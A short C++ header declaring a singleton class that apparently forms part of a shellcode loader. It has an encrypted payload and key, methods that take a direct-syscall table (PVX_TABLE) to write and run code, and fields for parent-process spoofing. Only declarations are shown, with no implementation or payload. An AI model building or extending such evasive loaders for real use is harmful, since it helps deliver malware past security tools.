#pragma once

class app : public singleton<app>
{
	public:
		std::vector<unsigned char> m_payload{};
		size_t m_size, m_keysize;
		HANDLE m_handle;

		PVOID m_address = NULL;

		auto retrieve() -> bool;

		auto invoke() -> bool;

		auto write(IN PVX_TABLE pVxTable) -> bool;

		auto run(IN PVX_TABLE pVxTable) -> bool;

	private:

		std::string m_process{};
		std::vector<unsigned char> m_key{};


		STARTUPINFOEX m_sysinfo = { 0 };
		PROCESS_INFORMATION	m_procinfo = { 0 };

		DWORD m_pid;
		HANDLE m_thread;

		// parent proc
		DWORD m_ppid; 
		HANDLE m_phandle;
		SIZE_T m_attsize = NULL;
		PPROC_THREAD_ATTRIBUTE_LIST	m_att = NULL;

		std::string m_args;
};